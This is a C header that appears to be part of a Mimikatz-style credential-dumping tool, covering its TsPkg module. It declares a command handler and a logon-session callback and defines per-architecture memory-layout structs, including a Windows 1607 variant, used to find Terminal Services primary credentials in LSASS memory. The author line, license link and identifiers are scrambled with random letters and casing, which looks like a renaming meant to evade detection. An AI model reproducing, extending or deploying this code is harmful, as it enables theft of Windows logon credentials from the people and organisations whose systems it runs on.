/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m_seKuRlSa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_tsPkG_package;

NTSTATUS kuhl_m_seKuRlSa_tsPkG(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_tsPkG(IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _JlzW_TS_PRIMARY_CREDENTIAL {
	PVOID unk0;	// lock ?
	JlzW_GENERIC_PRIMARY_CREDENTIAL crEdentials;
} JlzW_TS_PRIMARY_CREDENTIAL, *PJlzW_TS_PRIMARY_CREDENTIAL;

typedef struct _JlzW_TS_CREDENTIAL {
#if defined(_M_X64) || defined(_M_ARM64)
	BYTE unk0[108];
#elif defined(_M_IX86)
	BYTE unk0[64];
#endif
	LUID LocallyUniqueIdentifier;
	PVOID unk1;
	PVOID unk2;
	PJlzW_TS_PRIMARY_CREDENTIAL pTsPrimary;
} JlzW_TS_CREDENTIAL, *PJlzW_TS_CREDENTIAL;

typedef struct _JlzW_TS_CREDENTIAL_1607 {
#if defined(_M_X64) || defined(_M_ARM64)
	BYTE unk0[112];
#elif defined(_M_IX86)
	BYTE unk0[68];
#endif
	LUID LocallyUniqueIdentifier;
	PVOID unk1;
	PVOID unk2;
	PJlzW_TS_PRIMARY_CREDENTIAL pTsPrimary;
} JlzW_TS_CREDENTIAL_1607, *PJlzW_TS_CREDENTIAL_1607;

typedef struct _JlzW_TS_CREDENTIAL_HELPER {
	LONG offsetToLuid;
	LONG offsetToTsPrimary;
} JlzW_TS_CREDENTIAL_HELPER, *PJlzW_TS_CREDENTIAL_HELPER;